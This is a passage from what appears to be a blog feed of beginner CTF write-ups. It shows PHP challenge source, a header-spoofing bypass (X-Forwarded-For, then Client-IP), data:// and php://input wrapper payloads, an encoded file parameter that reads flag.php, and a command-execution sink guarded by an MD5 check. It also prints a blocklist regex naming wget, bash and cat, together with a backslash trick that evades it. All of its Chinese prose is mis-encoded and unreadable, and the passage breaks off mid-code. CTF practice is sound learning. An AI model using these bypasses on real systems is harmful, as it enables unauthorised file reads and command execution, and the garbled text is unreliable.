ï¼Œå¯ä»¥ç”¨<code>[CTFåœ¨çº¿å·¥å…·-åœ¨çº¿JSfuckåŠ å¯†|åœ¨çº¿JSfuckè§£å¯†|JSfuck|JSfuckåŸç†|JSfuckç®—æ³• (hiencode.com)](http://www.hiencode.com/jsfuck.html)</code>è§£ç (æˆ‘çœ‹å…¶å®ƒå¸ˆå‚…éƒ½æ˜¯ç›´æ¥ä¸¢åˆ°æ§åˆ¶å°é‡Œè¿è¡Œ)ã€‚</p><p>è§£ç åæ˜¯<code>alert(&quot;post me Merak&quot;))</code>ï¼Œ<code>POST</code>éšä¾¿ä¼ ä¸ªå€¼ï¼š<code>Merak=333</code>ï¼ŒåŒæ—¶ä¿®æ”¹<code>X-Forwarded-For: 127.0.0.1</code>ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs PHP">Flag is here~But how to get it? <span class="hljs-meta">&lt;?php</span> <br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>); <br><span class="hljs-keyword">include</span> <span class="hljs-string">&#x27;takeip.php&#x27;</span>;<br><span class="hljs-title function_ invoke__">ini_set</span>(<span class="hljs-string">&#x27;open_basedir&#x27;</span>,<span class="hljs-string">&#x27;.&#x27;</span>); <br><span class="hljs-keyword">include</span> <span class="hljs-string">&#x27;flag.php&#x27;</span>;<br><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;Merak&#x27;</span>]))&#123; <br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>); <br>    <span class="hljs-keyword">die</span>(); <br>&#125; <br><br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">change</span>(<span class="hljs-params"><span class="hljs-variable">$v</span></span>)</span>&#123; <br>    <span class="hljs-variable">$v</span> = <span class="hljs-title function_ invoke__">base64_decode</span>(<span class="hljs-variable">$v</span>); <br>    <span class="hljs-variable">$re</span> = <span class="hljs-string">&#x27;&#x27;</span>; <br>    <span class="hljs-keyword">for</span>(<span class="hljs-variable">$i</span>=<span class="hljs-number">0</span>;<span class="hljs-variable">$i</span>&lt;<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$v</span>);<span class="hljs-variable">$i</span>++)&#123; <br>        <span class="hljs-variable">$re</span> .= <span class="hljs-title function_ invoke__">chr</span> ( <span class="hljs-title function_ invoke__">ord</span> (<span class="hljs-variable">$v</span>[<span class="hljs-variable">$i</span>]) + <span class="hljs-variable">$i</span>*<span class="hljs-number">2</span> ); <span class="hljs-comment">//ordè¿”å›ASCIIå€¼ï¼Œchrè¿”å›å¯¹åº”çš„ASCIIå­—ç¬¦</span><br>    &#125; <br>    <span class="hljs-keyword">return</span> <span class="hljs-variable">$re</span>; <br>&#125;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;Local access only!&#x27;</span>.<span class="hljs-string">&quot;&lt;br/&gt;&quot;</span>;<br><span class="hljs-variable">$ip</span> = <span class="hljs-title function_ invoke__">getIp</span>();<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$ip</span>!=<span class="hljs-string">&#x27;127.0.0.1&#x27;</span>)<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Sorry,you don&#x27;t have permission!  Your ip is :&quot;</span>.<span class="hljs-variable">$ip</span>;<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$ip</span> === <span class="hljs-string">&#x27;127.0.0.1&#x27;</span> &amp;&amp; <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;2333&#x27;</span>]) === <span class="hljs-string">&#x27;todat is a happy day&#x27;</span> )&#123;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Your REQUEST is:&quot;</span>.<span class="hljs-title function_ invoke__">change</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>]);<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-title function_ invoke__">change</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>])); &#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>æˆ‘ä»¬çš„ç›®æ ‡æ˜¯<code>flag.php</code>,<code>/?file</code>çš„å€¼ç»è¿‡äº†ç®€å•çš„åŠ å¯†è¿‡ç¨‹ï¼Œé€†ç€å›å»å°±è¡Œï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$v</span> = <span class="hljs-string">&#x27;flag.php&#x27;</span>;<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">dechange</span>(<span class="hljs-params"><span class="hljs-variable">$v</span></span>)</span>&#123;<br><span class="hljs-variable">$re</span> = <span class="hljs-string">&#x27;&#x27;</span>;<br><span class="hljs-keyword">for</span>(<span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; <span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$v</span>); <span class="hljs-variable">$i</span>++)&#123;<br><span class="hljs-variable">$re</span> .= <span class="hljs-title function_ invoke__">chr</span>(<span class="hljs-title function_ invoke__">ord</span>(<span class="hljs-variable">$v</span>[<span class="hljs-variable">$i</span>]) - <span class="hljs-variable">$i</span> * <span class="hljs-number">2</span>);<br>&#125;<br><span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">base64_encode</span>(<span class="hljs-variable">$re</span>);<br>&#125;<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">dechange</span>(<span class="hljs-variable">$v</span>);<br><span class="hljs-meta">?&gt;</span><br><span class="hljs-comment">//ZmpdYSZmXGI=</span><br></code></pre></td></tr></table></figure><p>æ‰€ä»¥ç»™<code>file</code>èµ‹å€¼<code>ZmpdYSZmXGI=</code>ï¼Œæ³¨æ„è¦æ±‚<code>file_get_contents($_GET[&#39;2333&#39;]) === &#39;todat is a happy day&#39;</code>ï¼Œæ‰¾ä¸ªä¼ªåè®®å†™è¿›å»å°±è¡Œï¼š</p><p><code>?2333=data://text/plain,todat is a happy day</code>æˆ–è€…åˆ©ç”¨POSTæ–¹å¼å’Œ<code>input</code>ç»„åˆ</p><p><code>?2333=php://inputç„¶åæ•°æ®æ˜¯ todat is a happy day</code></p><p>æœ€ååˆ«å¿˜äº†åŠ ä¸ª<code>IP</code>ã€‚</p><p>è¿™ä¸ª<code>payload</code>æç¤º<code>Flag is here~But how to get it?Local access only!&lt;br/&gt;Sorry,you don&#39;t have permission!  Your ip is :sorry,this way is banned! </code>ã€‚ã€‚<code>XFF</code>å¤´ä¸èƒ½ç”¨ï¼Œæ”¹æˆ<code>Client-IP</code>è¯•äº†è¯•ï¼Œæ‹¿åˆ°<code>flag</code>:<code>flag&#123;b5aec9ee-7acb-45a4-b8e3-fbe4ae51f2f4&#125;</code></p><p><img src="/img/taowa4.png" alt="taowa4"></p><p>ç„¶ååˆ©ç”¨<code>input</code>ä¼ªåè®®å»å†™<code>todat is a happy day</code>ä¹Ÿè¡Œï¼Œæˆ‘æ²¡æœ‰å°è¯•ï¼Œè¿™é‡Œç›´æ¥å€Ÿç”¨äº†è¿™ä½å¸ˆå‚…çš„ç»“æœï¼š</p><p>å‚è€ƒ<code>https://www.cnblogs.com/rabbittt/p/13291746.html</code>:</p><p><img src="/img/taowa5.png" alt="taowa5"></p><p>å…¶å®è¿™é‡Œè¿˜æœ‰ä¸ªé—®é¢˜ï¼Œæˆ‘åˆ©ç”¨<code>GET</code>ä¼ å‚ä¹ æƒ¯åœ¨é—®å·å‰é¢åŠ ä¸ª<code>/</code>ï¼Œæ¯”å¦‚è¿™é¢˜ä¸€å¼€å§‹æˆ‘å†™çš„<code>secrettw.php/?balabala</code>ï¼Œä½†å‘ç°è¡Œä¸é€šã€‚ã€‚çœ‹æ¥ä»¥ååšé¢˜è¦æŠŠè¿™ä¸ªä¹ æƒ¯æ”¹æ‰ã€‚</p>]]></content>
    
    
    
    <tags>
      
      <tag>åšé¢˜è®°å½•</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>BuuCTFåšé¢˜è®°å½•_2</title>
    <link href="/2023/10/30/BUUCTF%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95_2/"/>
    <url>/2023/10/30/BUUCTF%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95_2/</url>
    
    <content type="html"><![CDATA[<p>åˆå­¦è€…çš„ä¸€äº›åšé¢˜è®°å½•</p><span id="more"></span><hr><h2 id="å®‰æ´µæ¯-2019-easy-web"><a href="#å®‰æ´µæ¯-2019-easy-web" class="headerlink" title="[å®‰æ´µæ¯ 2019]easy_web"></a>[å®‰æ´µæ¯ 2019]easy_web</h2><p>è¿›ç¯å¢ƒå‘ç°æ˜¯è¿™ä¹ˆä¸ªä¸œè¥¿ï¼Œ<code>URL</code>å€¼å¾—æ³¨æ„ï¼š</p><p><code>/index.php?img=TXpVek5UTTFNbVUzTURabE5qYz0&amp;cmd=</code></p><p><img src="/img/anxunbei1.png" alt="anxunbei1"></p><p>å³é”®æºç è¿˜å¯ä»¥å‘ç°ä¸€è¡Œå­—ï¼š<code>md5 is funny ~</code>(å’Œmd5æœ‰å…³ï¼Ÿ)ï¼Œä¼°è®¡æ˜¯è¢«è—åˆ°å›¾ç‰‡åé¢äº†ã€‚</p><p>å…ˆåœ¨kaliä¸‹ç”¨dirsearchæ‰«ä¸€ä¸‹çœ‹çœ‹æœ‰æ²¡æœ‰å…¶å®ƒæ–‡ä»¶ï¼š</p><p><code>dirsearch -u http://55a28404-cd69-4529-9626-2cd4d4f499d1.node4.buuoj.cn:81/ --delay 3 -t 30</code></p><p>æ²¡æœ‰ä»€ä¹ˆæœ‰ç”¨çš„ä¿¡æ¯ã€‚çœ‹çœ‹æºç ï¼š</p><p><img src="/img/anxunbei3.png" alt="anxunbei3"></p><p>é€‰ä¸­é‚£æ®µå­—ç¬¦æç¤ºäº†base64ï¼Œåˆ©ç”¨base64è½¬å›¾ç‰‡å·¥å…·è½¬æ¢ç»“æœå°±æ˜¯å·¦ä¸Šè§’é‚£å¼ å›¾ç‰‡ã€‚ä½†å¾ˆæ˜æ˜¾URLä¸­ä¸æ˜¯è¿™ä¸ªä¸œè¥¿ï¼Œåº”è¯¥æ˜¯å°†æ–‡ä»¶åè¿›è¡Œäº†å˜åŒ–ã€‚</p><p>imgå‚æ•°æ˜¯å¤§å°å†™å­—æ¯åŠ æ•°å­—çš„ç»„åˆï¼ŒçŒœæµ‹æ˜¯<code>base64</code>ï¼Œè€Œä¸”éšä¾¿è¾“ä¸ª<code>abc</code>å†çœ‹æºç ä¼šå‘ç°è¿™ä¹ˆä¸ªä¸œè¥¿ï¼š</p><p><img src="/img/anxunbei2.png" alt="anxunbei2"></p><p>ç›´æ¥base64è§£ç ï¼š<code>MzUzNTM1MmU3MDZlNjc=</code>ï¼Œåˆæ˜¯ä¸€ä¸²<code>base64</code>å†è§£ç ï¼š<code>3535352e706e67</code>ã€‚çœ‹ç€åƒåå…­è¿›åˆ¶ï¼Œè§£ä¸€ä¸‹ï¼š<code>555.png</code></p><p>ç°åœ¨è¿™ä¸ªå‚æ•°æ€ä¹ˆå‡ºæ¥çš„å°±æ¸…æ¥šäº†ï¼šå­—ç¬¦ä¸²å…ˆç»è¿‡åå…­è¿›åˆ¶ï¼Œå†ç»è¿‡ä¸¤æ¬¡base64åŠ å¯†ã€‚å‰é¢çŒœæµ‹è¿™æ˜¯ä¸ª<code>include</code>çš„å‚æ•°ï¼Œå› ä¸ºè¿™ä¸ª<code>img</code>å’Œ<code>cmd</code>å‚æ•°éƒ½æ˜¯åœ¨index.phpä¸‹çš„ï¼Œé‚£å°±ç›´æ¥çœ‹<code>index.php</code>æ˜¯å•¥ä¸œè¥¿(ç”¨åŒæ ·çš„æ–¹æ³•è½¬æ¢):img&#x3D;<code>TmprMlpUWTBOalUzT0RKbE56QTJPRGN3</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(E_ALL || ~ E_NOTICE);<br><span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&#x27;content-type:text/html;charset=utf-8&#x27;</span>);<br><span class="hljs-variable">$cmd</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>];<br><span class="hljs-keyword">if</span> (!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;img&#x27;</span>]) || !<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>])) <span class="hljs-comment">//å¦‚æœä¸¤ä¸ªå‚æ•°å…¶ä¸­ä¸€ä¸ªæ²¡è¢«èµ‹å€¼</span><br>    <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&#x27;Refresh:0;url=./index.php?img=TXpVek5UTTFNbVUzTURabE5qYz0&amp;cmd=&#x27;</span>);<br><span class="hljs-variable">$file</span> = <span class="hljs-title function_ invoke__">hex2bin</span>(<span class="hljs-title function_ invoke__">base64_decode</span>(<span class="hljs-title function_ invoke__">base64_decode</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;img&#x27;</span>])));<span class="hljs-comment">//imgè§£ç </span><br><br><span class="hljs-variable">$file</span> = <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-string">&quot;/[^a-zA-Z0-9.]+/&quot;</span>, <span class="hljs-string">&quot;&quot;</span>, <span class="hljs-variable">$file</span>);<span class="hljs-comment">//æ³¨æ„^ï¼Œä¼šæ­£åˆ™åŒ¹é…éå¤§å°å†™å­—æ¯åŠæ•°å­—å’Œç‚¹ï¼Œæ¢æˆç©ºæ ¼</span><br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/flag/i&quot;</span>, <span class="hljs-variable">$file</span>)) &#123;<span class="hljs-comment">//å¤§å°å†™åŒ¹é…flag</span><br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;img src =&quot;./ctf3.jpeg&quot;&gt;&#x27;</span>;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;xixiï½ no flag&quot;</span>);<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-variable">$txt</span> = <span class="hljs-title function_ invoke__">base64_encode</span>(<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$file</span>));<span class="hljs-comment">//åˆ©ç”¨file_get_contentsè¯»ç›®æ ‡æ–‡ä»¶å†…å®¹ï¼Œå¹¶ä½¿ç”¨base64åŠ å¯†</span><br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;img src=&#x27;data:image/gif;base64,&quot;</span> . <span class="hljs-variable">$txt</span> . <span class="hljs-string">&quot;&#x27;&gt;&lt;/img&gt;&quot;</span>;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;<br>&#125;<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$cmd</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;<br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/ls|bash|tac|nl|more|less|head|wget|tail|vi|cat|od|grep|sed|bzmore|bzless|pcre|paste|diff|file|echo|sh|\&#x27;|\&quot;|\`|;|,|\*|\?|\\|\\\\|\n|\t|\r|\xA0|\&#123;|\&#125;|\(|\)|\&amp;[^\d]|@|\||\\$|\[|\]|&#123;|&#125;|\(|\)|-|&lt;|&gt;/i&quot;</span>, <span class="hljs-variable">$cmd</span>)) &#123;<br>    <span class="hljs-keyword">echo</span>(<span class="hljs-string">&quot;forbid ~&quot;</span>);<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-keyword">if</span> ((<span class="hljs-keyword">string</span>)<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;a&#x27;</span>] !== (<span class="hljs-keyword">string</span>)<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;b&#x27;</span>] &amp;&amp; <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;a&#x27;</span>]) === <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;b&#x27;</span>])) &#123;<span class="hljs-comment">//ä¸€å¼€å§‹æƒ³çš„æ•°ç»„ç»•è¿‡å³$a[]=1è€Œä¸”$b[]=2ï¼Œä¸è¿‡ä»–å‰é¢æœ‰ä¸ª(string)å¼ºåˆ¶ç±»å‹è½¬æ¢(string(5) &quot;Array&quot;)ï¼Œåªèƒ½æ‰¾ç¢°æ’ç»•è¿‡äº†ã€‚</span><br>        <span class="hljs-keyword">echo</span> `<span class="hljs-variable">$cmd</span>`;<span class="hljs-comment">//æ³¨æ„åå¼•å·ï¼Œæ‰§è¡Œå‘½ä»¤çš„ç»“æ„ç›´æ¥echo</span><br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-keyword">echo</span> (<span class="hljs-string">&quot;md5 is funny ~&quot;</span>);<br>    &#125;<br>&#125;<br><br><span class="hljs-meta">?&gt;</span><br>&lt;html&gt;<br>&lt;style&gt;<br>  body&#123;<br>   background:<span class="hljs-title function_ invoke__">url</span>(./bj.png)  no-repeat center center;<br>   background-size:cover;<br>   background-attachment:fixed;<br>   background-color:<span class="hljs-comment">#CCCCCC;</span><br>&#125;<br>&lt;/style&gt;<br>&lt;body&gt;<br>&lt;/body&gt;<br>&lt;/html&gt;<br></code></pre></td></tr></table></figure><p>æœ€å¼€å§‹æ­£åˆ™åŒ¹é…<code>\</code>é‚£é‡Œæ²¡å¼„æ˜ç™½ï¼Œä¸€å¼€å§‹è§‰å¾—<code>|\\|\\\\|</code>è¿™ä¿©ä¸œè¥¿å°±ä¼šæŠŠ<code>\</code>è¿™ä¸œè¥¿ç»™åŒ¹é…äº†ï¼Œå»ç½‘ä¸Šæœäº†wpå‘ç°éƒ½è¯´ç›´æ¥<code>l\s</code>å°±èƒ½ç»•è¿‡ã€‚åé¢å‘ç°è‡ªå·±æƒ³é”™äº†ï¼Œ<code>|\\|\\\\|</code>è¿™ä¸œè¥¿å¹¶ä¸ä¼šåŒ¹é…åˆ°<code>\</code>ï¼Œéœ€è¦<code>\\\</code>æ‰è¡Œã€‚ä¸¾ä¸ªæ —å­ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>    <span class="hljs-variable">$string</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;b&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/\\/i&quot;</span>, <span class="hljs-variable">$string</span>))&#123;<br><br>        <span class="hljs-keyword">echo</span> (<span class="hljs-string">&#x27;æ£€æµ‹åˆ°\\&#x27;</span>);<span class="hljs-comment">//ä¸€ä¸ªåæ–œæ éœ€è¦å¦ä¸€ä¸ªåæ–œæ è¿›è¡Œè½¬ä¹‰ï¼Œè¿™å…¶å®æ˜¯ä¸€ä¸ªåæ–œæ </span><br>   &#125;<br>    <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-keyword">echo</span> (<span class="hljs-string">&#x27;æ²¡æ£€æµ‹åˆ°&#x27;</span>);<br><br>   &#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>è¿™æ—¶æˆ‘ä»¬ä¼ <code>?b=</code>ä»»ä½•å€¼éƒ½ä¼šæŠ¥é”™ï¼š</p><p><code> **Warning**:  preg_match(): No ending delimiter &#39;/&#39; found in **D:\phpstudy_pro\WWW\wow.php** on line **4**</code></p><p>ç”µè„‘æ²¡æœ‰æ‰¾åˆ°<code>/</code>è¿™ä¸ªç»“æŸå®šç•Œç¬¦ã€‚æƒ³äº†ä¸‹åŸå› ï¼Œæ—¢ç„¶<code>\</code>è¿™ä¸ªä¸œè¥¿æ˜¯è½¬ä¹‰å­—ç¬¦ï¼Œé‚£ä¹ˆ<code>\\</code>åªä¸è¿‡æ˜¯ä¸€ä¸ªè½¬ä¹‰åçš„<code>\</code>ï¼Œè¿™ä¸ªä¸œè¥¿å’Œ<code>/</code>ç»„åˆåˆ°ä¸€èµ·ä¼šå»æ­£åˆ™åŒ¹é…<code>/</code>è¿™ä¸ªä¸œè¥¿ï¼Œè¿™æ ·ä¸€æ¥å¯¼è‡´ç¼ºå°‘å°¾éƒ¨ç•Œå®šç¬¦ã€‚ä¿®æ”¹ä¸€ä¸‹ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>    <span class="hljs-variable">$string</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;b&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/\\//i&quot;</span>, <span class="hljs-variable">$string</span>))&#123;<br><br>        <span class="hljs-keyword">echo</span> (<span class="hljs-string">&#x27;æ£€æµ‹åˆ°&#x27;</span>);<br>   &#125;<br>    <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-keyword">echo</span> (<span class="hljs-string">&#x27;æ²¡æ£€æµ‹åˆ°&#x27;</span>);<br><br>   &#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>è¿™æ—¶ä¸ä¼šæŠ¥é”™è€Œä¸”å›å»æ­£åˆ™åŒ¹é…<code>/</code>ï¼Œç°åœ¨æ€è·¯å°±æ¸…æ™°äº†ï¼šå¦‚æœæˆ‘ä»¬æƒ³æ­£åˆ™åŒ¹é…<code>\</code>ï¼Œé‚£ä¹ˆå°±éœ€è¦<code>\\\</code>æ‰è¡Œï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>    <span class="hljs-variable">$string</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;b&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/\\\/i&quot;</span>, <span class="hljs-variable">$string</span>))&#123;<br><br>        <span class="hljs-keyword">echo</span> (<span class="hljs-string">&#x27;æ£€æµ‹åˆ°&#x27;</span>);<br>   &#125;<br>    <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-keyword">echo</span> (<span class="hljs-string">&#x27;æ²¡æ£€æµ‹åˆ°&#x27;</span>);<br><br>   &#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>ç°åœ¨å†çœ‹çœ‹è¿™æ®µæ­£åˆ™åŒ¹é…æ€ä¹ˆä¸ªäº‹ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>    <span class="hljs-variable">$string</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;b&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/ls|bash|tac|nl|more|less|head|wget|tail|vi|cat|od|grep|sed|bzmore|bzless|pcre|paste|diff|file|echo|sh|\&#x27;|\&quot;|\`|;|,|\*|\?|\\|\\\\|\n|\t|\r|\xA0|\&#123;|\&#125;|\(|\)|\&amp;[^\d]|@|\||\\$|\[|\]|&#123;|&#125;|\(|\)|-|&lt;|&gt;/i&quot;</span>, <span class="hljs-variable">$string</span>))&#123;<br><br>        <span class="hljs-keyword">echo</span> (<span class="hljs-string">&#x27;æ£€æµ‹åˆ°&#x27;</span>);<br>   &#125;<br>    <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-keyword">echo</span> (<span class="hljs-string">&#x27;æ²¡æ£€æµ‹åˆ°&#x27;</span>);<br><br>   &#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>æ³¨æ„<code>|\\|\\\\|</code>ï¼Œè¿™ä¸œè¥¿ç›¸å½“äºå»åŒ¹é…<code>|\\\\</code>ã€‚å› ä¸ºå‰ä¸¤ä¸ª<code>\\</code>å›å»è½¬ä¹‰åé¢é‚£ä¸ªåˆ†éš”ç¬¦<code>|</code>ï¼Œå†åŠ ä¸Š<code>\\\\</code>ï¼Œç„¶åä»¥<code>|</code>æ”¶å°¾ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>    <span class="hljs-variable">$string</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;b&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/ls|bash|tac|nl|more|less|head|wget|tail|vi|cat|od|grep|sed|bzmore|bzless|pcre|paste|diff|file|echo|sh|\&#x27;|\&quot;|\`|;|,|\*|\?|\\|\\\\|\n|\t|\r|\xA0|\&#123;|\&#125;|\(|\)|\&amp;[^\d]|@|\||\\$|\[|\]|&#123;|&#125;|\(|\)|-|&lt;|&gt;/i&quot;</span>, <span class="hljs-variable">$string</span>))&#123;<br><br>        <span class="hljs-keyword">echo</span> 